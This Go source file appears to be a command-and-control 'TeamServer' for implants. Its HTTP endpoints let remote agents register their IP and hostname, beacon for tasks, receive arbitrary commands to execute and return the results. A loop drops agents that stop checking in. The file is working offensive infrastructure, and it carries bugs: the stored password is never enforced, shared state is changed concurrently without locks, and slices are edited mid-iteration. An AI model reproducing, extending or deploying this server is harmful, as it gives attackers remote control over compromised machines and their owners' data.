package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

type Agent struct {
	IP       string
	Hostname string
	Sleep    string
	UID      string
}

type Task struct {
	UID       string
	CommandID string
	Command   string
}

type CommandData struct {
	CommandID string
	Command   string
}

type Result struct {
	CommandID string
	Result    string
}

type Callback struct {
	AgentUID     string
	LastCallback int
}

type TeamServer struct {
	IP             string
	Port           string
	Password       string
	AgentList      []Agent
	AgentTasks     []Task
	AgentResults   []Result
	AgentCallbacks []Callback
}

func NewTeamServer(ip, port, password string) *TeamServer {
	return &TeamServer{
		IP:       ip,
		Port:     port,
		Password: password,
	}
}

func (ts *TeamServer) randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func (ts *TeamServer) checkBeacons() {
	for {
		time.Sleep(1 * time.Second)
		for i, callback := range ts.AgentCallbacks {
			agent, found := ts.findAgentByUID(callback.AgentUID)
			if !found {
				continue
			}
			ts.AgentCallbacks[i].LastCallback++
			agentSleep, _ := strconv.Atoi(agent.Sleep)
			if ts.AgentCallbacks[i].LastCallback > agentSleep+5 {
				fmt.Printf("[!] Agent [%s] has gone offline.\n", agent.UID)
				ts.removeAgent(agent.UID)
			}
		}
	}
}

func (ts *TeamServer) findAgentByUID(uid string) (Agent, bool) {
	for _, agent := range ts.AgentList {
		if agent.UID == uid {
			return agent, true
		}
	}
	return Agent{}, false
}

func (ts *TeamServer) removeAgent(uid string) {
	for i, agent := range ts.AgentList {
		if agent.UID == uid {
			ts.AgentList = append(ts.AgentList[:i], ts.AgentList[i+1:]...)
			return
		}
	}
}

func (ts *TeamServer) registerHTTPListeners(r *gin.Engine) {
	r.GET("/agents", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"agents": ts.AgentList})
	})

	r.GET("/tasks/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		tasks := []Task{}

		for i, callback := range ts.AgentCallbacks {
			if callback.AgentUID == uid {
				ts.AgentCallbacks = append(ts.AgentCallbacks[:i], ts.AgentCallbacks[i+1:]...)
			}
		}

		ts.AgentCallbacks = append(ts.AgentCallbacks, Callback{AgentUID: uid, LastCallback: 0})

		for _, task := range ts.AgentTasks {
			if task.UID == uid {
				tasks = append(tasks, task)
			}
		}

		if len(tasks) > 0 {
			c.JSON(http.StatusOK, gin.H{"tasks": tasks})
			return
		}

		c.JSON(http.StatusNotFound, gin.H{"message": "No tasks found"})
	})

	r.POST("/tasks/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		var command CommandData

		if err := c.BindJSON(&command); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid JSON", "error": err.Error()})
			return
		}

		for _, agent := range ts.AgentList {
			if agent.UID == uid {
				commandID := ts.randomString(10)
				tempTask := Task{UID: uid, CommandID: commandID, Command: command.Command}
				ts.AgentTasks = append(ts.AgentTasks, tempTask)
				c.JSON(http.StatusOK, gin.H{"message": "Task sent successfully", "uid": commandID})
				return
			}
		}

		c.JSON(http.StatusNotFound, gin.H{"message": "Agent not found"})
	})

	r.POST("/register", func(c *gin.Context) {
		var agent Agent
		if err := c.BindJSON(&agent); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid JSON", "error": err.Error()})
			return
		}

		agent.UID = ts.randomString(10)
		ts.AgentList = append(ts.AgentList, agent)
		c.JSON(http.StatusOK, gin.H{"message": "Agent registered successfully", "uid": agent.UID, "sleep": agent.Sleep})
	})

	r.POST("/results/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		var result Result
		if err := c.BindJSON(&result); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid JSON", "error": err.Error()})
			return
		}

		if uid != result.CommandID {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Invalid command ID"})
			return
		}

		for i, task := range ts.AgentTasks {
			if task.CommandID == result.CommandID {
				ts.AgentResults = append(ts.AgentResults, result)
				ts.AgentTasks = append(ts.AgentTasks[:i], ts.AgentTasks[i+1:]...)
				c.JSON(http.StatusOK, gin.H{"message": "Result received successfully"})
				return
			}
		}

		c.JSON(http.StatusNotFound, gin.H{"message": "Result not found for the given command ID"})
	})

	r.GET("/results/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		results := []Result{}

		for _, result := range ts.AgentResults {
			if result.CommandID == uid {
				results = append(results, result)
			}
		}

		if len(results) > 0 {
			c.JSON(http.StatusOK, gin.H{"results": results})
			return
		}

		c.JSON(http.StatusNotFound, gin.H{"message": "No results found"})
	})
}

func start_http_listener(ts *TeamServer, port string) {
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	ts.registerHTTPListeners(r)

	go func() {
		r.Run(ts.IP + ":" + port)
	}()
}
